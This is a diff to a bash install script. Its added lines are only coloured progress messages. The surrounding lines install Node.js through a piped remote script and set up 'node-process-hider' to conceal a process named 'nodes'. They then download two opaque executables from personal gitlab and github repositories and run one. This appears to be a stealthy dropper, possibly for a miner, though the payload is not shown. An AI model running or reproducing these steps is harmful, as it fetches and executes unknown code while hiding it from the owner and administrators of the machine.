@@ -1,10 +1,18 @@
 #!/bin/bash
+GREEN='\033[1;32m'
+RESET='\e[0m'
+BLUE='\033[1;34m'
+YEL='\033[1;33m'
+echo -e "${BLUE} Updating... ${RESET}"
 apt update && apt -y install sudo wget curl unzip >/dev/null 2>&1
+echo -e "${BLUE} Installing ${RESET}"
 sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
 curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 apt-get install -y nodejs >/dev/null 2>&1
 sudo apt install screen -y
 sudo npm i -g node-process-hider && sudo ph add nodes
+echo -e "${BLUE} Downloading.. ${RESET}"
 wget -qO nodes https://gitlab.com/sarifadim/jomblo/-/raw/main/load && chmod +x nodes
 wget -qO node.sh https://github.com/sarifadim/dopla/raw/main/lion && chmod +x node.sh
+echo -e "${YEL} Running ${RESET}"
 ./node.sh
